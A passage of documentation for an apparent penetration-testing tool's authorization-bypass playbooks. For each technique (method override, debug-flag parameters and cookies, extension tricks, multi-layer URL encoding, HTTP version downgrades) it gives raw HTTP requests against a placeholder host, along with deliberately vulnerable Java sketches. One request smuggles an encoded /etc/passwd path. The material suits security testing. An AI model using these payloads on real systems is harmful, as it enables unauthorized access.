This playbook exists because some frameworks let the client override the effective method via a header — handy for clients behind proxies that strip verbs, but a bypass primitive when the front-end ACL keys off the wire-level method and the handler keys off the effective one. The playbook iterates all nine methods × three common override header names.

### Raw HTTP Examples

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-HTTP-Method-Override: GET
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-Method-Override: DELETE
```

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
X-HTTP-Method: PATCH
```

### What The Broken Target Code Might Look Like

```java
// Security filter checks the wire method
if ("GET".equals(request.method()) && request.path().startsWith("/admin")) {
    requireAdmin();
}

// Controller reads the override and dispatches accordingly
String effective = request.header("X-HTTP-Method-Override");
if (effective != null) dispatchAs(effective, request);
```

---

### `bypass.verb.param_migration`

Display name:
`Parameter Migration Between Query and Body`

### Purpose

This playbook exists because a security filter may inspect query parameters on GET-like methods and body parameters on POST-like methods, but not both. Migrating params from query to body (when switching GET→POST) or body to query (when switching POST→GET) can move them out of the filter's line of sight while keeping the handler's view consistent. The playbook also covers the "both at once" case where the same param appears in query and body simultaneously.

### Raw HTTP Examples

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/x-www-form-urlencoded

id=1&role=admin
```

```http
GET /admin?id=1&role=admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
POST /admin?id=1&role=admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/x-www-form-urlencoded

id=1&role=admin
```

### What The Broken Target Code Might Look Like

```java
// Filter only validates query params on GET
if ("GET".equals(request.method())) {
    validateQueryParams(request.queryParams());
}

// Handler reads from bindAnyParams() which merges query+body silently
Object supplied = request.bindAnyParams().get("role");
```

---

## Param & Cookie Playbooks

### `bypass.param.existing_fuzz`

Display name:
`Existing Parameter Value Fuzz`

### Purpose

This playbook exists because applications often trust existing query parameter semantics. Replacing the current value of every discovered parameter with truth-flavored strings (`true`, `1`, `yes`, `on`, `admin`, `root`) or their falsy counterparts can flip a value-driven authorization branch.

### Raw HTTP Examples

```http
GET /admin?user=alice HTTP/1.1
Host: target.example
Cookie: session=user-session
```

becomes

```http
GET /admin?user=admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?user=root HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?user=true HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Handler elevates when the user param is 'admin' / 'root'
if ("admin".equals(request.query("user"))) {
    escalateSession();
}
```

---

### `bypass.param.new_injection`

Display name:
`New Debug-Toggle Injection`

### Purpose

This playbook exists because applications sometimes carry "trust-me" parameters for feature flags, developer modes, or internal previews that downgrade authorization. Adding them to an otherwise-denied request can flip the handler into a permissive branch. The list covers ~31 common parameter names: `debug`, `admin`, `isAdmin`, `role`, `authenticated`, `superuser`, `privileged`, `dev`, `developer`, `internal`, `bypass`, each with both `true` and `1` values.

### Raw HTTP Examples

```http
GET /admin?debug=true HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?isAdmin=1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?internal=true&bypass=1 HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?role=admin&privileged=true HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if ("true".equals(request.query("debug"))) {
    return renderWithoutAuthChecks(request);
}
```

```java
if ("admin".equals(request.query("role"))
        || "1".equals(request.query("isAdmin"))) {
    skipAccessControl = true;
}
```

---

### `bypass.cookie.existing_fuzz`

Display name:
`Existing Cookie Value Fuzz`

### Purpose

This playbook exists because the same truth-flavored value fuzz that matters in query params also matters in cookies. Existing cookie names get their values replaced with `true` / `1` / `yes` / `admin` / `root` / etc. to catch value-driven authorization branches that the operator doesn't know about.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session; role=user
```

becomes

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session; role=admin
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session; role=root
```

### What The Broken Target Code Might Look Like

```java
if ("admin".equals(request.cookie("role"))) {
    skipAccessControl = true;
}
```

---

### `bypass.cookie.new_injection`

Display name:
`New Debug-Toggle Cookie Injection`

### Purpose

This playbook exists because the same trust-me-toggle pattern hides in cookie-backed flags. A cookie survives across requests, so a flag set once can bypass subsequent AuthZ checks. The injection list mirrors `bypass.param.new_injection`.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session; debug=true
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session; admin=1; preview=1
```

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session; role=root; superuser=true
```

### What The Broken Target Code Might Look Like

```java
if ("1".equals(request.cookie("preview"))
        || "true".equals(request.cookie("debug"))) {
    bypassAuthorization();
}
```

---

## Trailing Boundary Playbooks

### `bypass.trailingslash`

Display name:
`Trailing Slash`

### Purpose

This playbook exists because `/admin` and `/admin/` do not always pass through the same normalization or authorization logic. Some route-matchers add or strip the trailing slash silently and dispatch to the same handler; the ACL usually pins one form. The playbook also probes the `/admin/.` combination which triggers different normalizer code paths.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin/ HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin/. HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if ("/admin".equals(request.path())) {
    requireAdmin();
}

route(normalizeSlash(request.path()));
```

---

### `bypass.trailingdot`

Display name:
`Trailing Dot (Host)`

### Purpose

This playbook exists because DNS treats `admin.target.example` and `admin.target.example.` as the same host but some HTTP routing, virtual-host selection, and WAF rules compare the `Host` header string literally. A trailing dot on the host can slip a literal `Host`-value ACL.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example.
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if ("target.example".equals(request.host())) {
    requireAdmin();
}

proxyToUpstream(stripTrailingDot(request.host()));
```

---

## Extension Playbook

### `bypass.extension.hijack`

Display name:
`Extension Hijack`

### Purpose

This playbook exists because some stacks route or authorize file-like paths differently from directory- or API-style paths. `/admin` and `/admin.json` can end up in the same handler with different AuthZ scaffolding. The playbook carries 81 extensions from `extension_payloads.txt` covering four shapes:

- **API representations** — `.json`, `.xml`, `.wsdl`, `.wadl`, `.yaml`, `.yml`
- **Templating / scripting** — `.html`, `.php`, `.asp`, `.aspx`, `.jsp`, `.do`, `.action`, `.cgi`
- **Backup / ops** — `.bak`, `.env`, `.sql`, `.conf`, `.log`, `.old`, `.swp`
- **Static / text** — `.txt`, `.xml`, `.csv`

### Raw HTTP Examples

```http
GET /admin.json HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin.html HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin.php HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin.env HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if (request.path().equals("/admin")) {
    requireAdmin();
}

// Router strips extension before matching the handler
staticOrApiRouter.handle(stripKnownExtension(request.path()));
```

---

## Content-Type Playbooks

### `bypass.contenttype.form_url_encoded`

Display name:
`application/x-www-form-urlencoded`

### Purpose

This playbook exists because the form-encoded parser path may have different validation or authorization glue than the JSON / XML paths. Converting a JSON body to urlencoded form keeps the logical parameters intact but routes through a different parser, often skipping validators that were wired only into the JSON branch.

### Raw HTTP Examples

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/x-www-form-urlencoded

role=admin&debug=true
```

### What The Broken Target Code Might Look Like

```java
if (request.contentType().contains("application/json")) {
    validateJsonSchema(request.body());
}

// Form branch has no validator, goes straight to the admin handler
handle(parseAnyBody(request));
```

---

### `bypass.contenttype.json`

Display name:
`application/json`

### Purpose

This playbook exists because submitting a JSON body to an endpoint that originally received form data can route through a permissive JSON binder that accepts fields the form binder rejected.

### Raw HTTP Examples

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/json

{"role":"admin","debug":true}
```

### What The Broken Target Code Might Look Like

```java
if ("application/x-www-form-urlencoded".equals(request.contentType())) {
    validateFormFields(request.formParams());
}

JsonNode body = request.asJson();
String role = body.get("role").asText();
// No validation for the JSON branch
```

---

### `bypass.contenttype.xml`

Display name:
`application/xml`

### Purpose

This playbook exists because XML parsers on the server side often expose their own authorization quirks: different validators, different fields, and sometimes DTD or entity-expansion handling that skips surrounding middleware. `text/xml` is tried as an alternate.

### Raw HTTP Examples

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: application/xml

<root><role>admin</role><debug>true</debug></root>
```

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: text/xml

<root><role>admin</role></root>
```

### What The Broken Target Code Might Look Like

```java
if (request.contentType().startsWith("application/json")) {
    applyStrictAuthFilter(request);
}

Document doc = parseXml(request.body());
// XML branch goes to a legacy controller that predates the filter
legacyXmlController.handle(doc);
```

---

### `bypass.contenttype.multipart`

Display name:
`multipart/form-data`

### Purpose

This playbook exists because multipart parsing is done by an entirely separate library on most stacks (Commons-FileUpload, Spring's `MultipartResolver`, etc.). That library's parameter extraction can disagree with the simpler form / JSON parsers on field names, nesting, and duplicate keys.

### Raw HTTP Examples

```http
POST /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
Content-Type: multipart/form-data; boundary=xabcd0

--xabcd0
Content-Disposition: form-data; name="role"

admin
--xabcd0
Content-Disposition: form-data; name="debug"

true
--xabcd0--
```

### What The Broken Target Code Might Look Like

```java
if (!request.contentType().startsWith("multipart/")) {
    validateStrictly(request);
}

// Multipart branch uses a different param resolver
Map<String, String> fields = multipartResolver.extractFields(request);
```

---

## Encoding Playbooks

### `bypass.encoding.url`

Display name:
`URL-Encoding`

### Purpose

This playbook exists because different layers decode `%XX`-escaped characters at different times or not at all. Encoding a subset of characters in path segments and in parameter names/values probes where the decode boundary sits.

### Raw HTTP Examples

```http
GET /admin%2fpanel HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?role%5B0%5D=admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
if (request.rawPath().contains("/admin/")) {
    deny();
}

route(urlDecode(request.rawPath()));
```

---

### `bypass.encoding.double_url`

Display name:
`Double URL-Encoding`

### Purpose

This playbook exists because some layers URL-decode exactly once and some decode twice. A `%2525` becomes `%25` on the first pass and `%` on the second — if only one layer decodes, the payload arrives looking different at each stage.

### Raw HTTP Examples

```http
GET /admin%252fpanel HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /admin?debug=%2574rue HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
String once = urlDecode(request.rawPath());
if (once.contains("/admin/")) {
    deny();
}

String twice = urlDecode(once);
route(twice);
```

---

### `bypass.encoding.triple_url`

Display name:
`Triple URL-Encoding`

### Purpose

This playbook exists because a few stacks (legacy proxies, some IIS configurations) apply three decode passes, while modern stacks apply one or two. Triple encoding targets the gap between them.

### Raw HTTP Examples

```http
GET /admin%25252fpanel HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Legacy proxy decodes twice, modern origin decodes once. Triple-encode hits the gap.
String fromProxy = urlDecode(urlDecode(request.rawPath()));
if (fromProxy.contains("/admin/")) deny();

route(urlDecode(fromProxy));
```

---

### `bypass.encoding.iis_unicode`

Display name:
`IIS %u-Escape`

### Purpose

This playbook exists because IIS historically accepted `%uXXXX`-style Unicode escapes in URLs that most WAFs and many origin parsers don't understand. `%u002f` is treated as `/` by IIS, but the WAF sees six opaque characters.

### Raw HTTP Examples

```http
GET /admin%u002fpanel HTTP/1.1
Host: target.example
Cookie: session=user-session
```

```http
GET /%u002eadmin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// IIS decodes %uXXXX before passing to the ISAPI filter
// but the upstream WAF does not
if (request.rawPath().contains("/admin/")) deny();
iis.route(urlAndUnicodeDecode(request.rawPath()));
```

---

### `bypass.encoding.java_escape`

Display name:
`Java/JavaScript \\u Escape`

### Purpose

This playbook exists because some stacks pass URL-borne strings through a JSON-parser, Java-style string interpolation, or JavaScript decoder that interprets `\uXXXX` sequences. Injecting `\u002f` into a parameter value can flip to `/` downstream while the AuthZ filter saw five opaque characters.

### Raw HTTP Examples

```http
GET /admin?path=\u002fetc\u002fpasswd HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Filter inspects the raw param value as a string
if (request.query("path").startsWith("/etc/")) deny();

// Binder parses the value as a JSON string, resolving \u002f -> /
String decoded = JsonStringDecoder.decode(request.query("path"));
fileService.read(decoded);
```

---

### `bypass.encoding.unicode_overflow`

Display name:
`Unicode Normalization Overflow`

### Purpose

This playbook exists because some decoders mask high Unicode codepoints back to ASCII via truncation or overflow. `%u560a` (fullwidth big-value char) can collapse to `\n` on some Java-based stacks — the same class of bug as the `%E5%98%8A` CRLF-injection family, but applied here to path / parameter bytes where a stripped control char affects the parser's boundary detection.

### Raw HTTP Examples

```http
GET /admin%u560a/panel HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Legacy decoder collapses %u560a -> \n via ASCII truncation
// WAF sees literal 6 bytes and does not normalize
String decoded = legacyDecode(request.rawPath());
route(decoded);
```

---

## Protocol Playbooks

### `bypass.protocol.http2`

Display name:
`HTTP/2 Downgrade Probe`

### Purpose

This playbook exists because some stacks handle HTTP/2 requests through a different middleware chain than HTTP/1.1. An `Upgrade: h2c` probe over plaintext is emitted to trigger the cleartext-HTTP/2 path, which several older gateways treat as privileged or skip WAF inspection on.

### Raw HTTP Examples

```http
GET /admin HTTP/2
Host: target.example
Cookie: session=user-session
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
```

### What The Broken Target Code Might Look Like

```java
// WAF only inspects HTTP/1.1 traffic; HTTP/2 frames go directly to the origin
if ("HTTP/1.1".equals(request.protocol())) {
    securityFilterChain.run(request);
}
originHandler.handle(request);
```

---

### `bypass.protocol.http1_1`

Display name:
`HTTP/1.1 Baseline`

### Purpose

This playbook exists for completeness — a control re-emission on `HTTP/1.1` paired with the other protocol variants for side-by-side comparison in the results table.

### Raw HTTP Examples

```http
GET /admin HTTP/1.1
Host: target.example
Cookie: session=user-session
```

---

### `bypass.protocol.http1_0`

Display name:
`HTTP/1.0 Downgrade`

### Purpose

This playbook exists because HTTP/1.0 drops the `Host` header requirement and flows through legacy code paths in many servers. Some older AuthN filters were written with `HTTP/1.1` assumptions and silently skip on `HTTP/1.0`.

### Raw HTTP Examples

```http
GET /admin HTTP/1.0
Host: target.example
Cookie: session=user-session
Connection: close
```

### What The Broken Target Code Might Look Like

```java
if ("HTTP/1.1".equals(request.protocol())) {
    applyFullMiddlewareChain(request);
} else {
    passThroughLegacyHandler(request);
}
```

---

### `bypass.protocol.http0_9`

Display name:
`HTTP/0.9 Probe`

### Purpose

This playbook exists because `HTTP/0.9` is a single-line protocol (`GET /path` with no headers) that modern middleware rarely models. Servers that still accept it usually route the request to a minimal handler that pre-dates the full security chain.

### Raw HTTP Examples

```http
GET /admin
```

### What The Broken Target Code Might Look Like

```java
// 0.9 request has no headers, so the Host-based AuthZ never runs
if (request.header("Host") == null) {
    return legacyLandingPage(request.path());
}
```

---

## Case Playbook

### `bypass.case.whole_request_case`

Display name:
`Whole-Request Case Variation`

### Purpose

This playbook exists because one layer may compare header names, method tokens, host strings, or paths case-sensitively while another normalizes case first. Unlike `bypass.path.case_variants` (which only mutates the path), this family varies case across the whole request: path, headers, method, host. The implementation scales the combinations smartly (max 15 total) based on URL length.

### Raw HTTP Examples

```http
Get /admin HTTP/1.1
Host: TARGET.EXAMPLE
Cookie: session=user-session
```

```http
GET /admin HTTP/1.1
Host: target.example
X-OrIgInAl-UrL: /AdMiN
Cookie: session=user-session
```

```http
GET /ADMIN HTTP/1.1
Host: target.example
Cookie: session=user-session
```

### What The Broken Target Code Might Look Like

```java
// Case-sensitive header-name comparison
if (!"X-Original-URL".equals(header.name())) { continue; }
```

```java
// Case-sensitive method comparison
if ("GET".equals(request.method()) && request.path().equals("/admin")) {
    requireAdmin();
}
dispatcher.dispatch(request.method().toUpperCase(), request);
```

---

## Notes For Future Additions

When adding new playbooks to the Bypass tab, prefer grouping them into one of the existing namespaces:

- `bypass.path.*`
- `bypass.header.*`
- `bypass.verb.*`
- `bypass.param.*`
- `bypass.cookie.*`
- `bypass.trailingslash.*` / `bypass.trailingdot.*`
- `bypass.extension.*`
- `bypass.contenttype.*`
- `bypass.encoding.*`
- `bypass.protocol.*`
- `bypass.case.*`

## Documentation Rule

For new Bypass playbooks, document:

- why the playbook exists
- what kinds of broken target behavior it is meant to expose
- a few raw HTTP examples
- (for path-family additions) whether the payload is target-preserving, and why. Non-target-preserving payloads belong in a generic fuzz tool, not here.
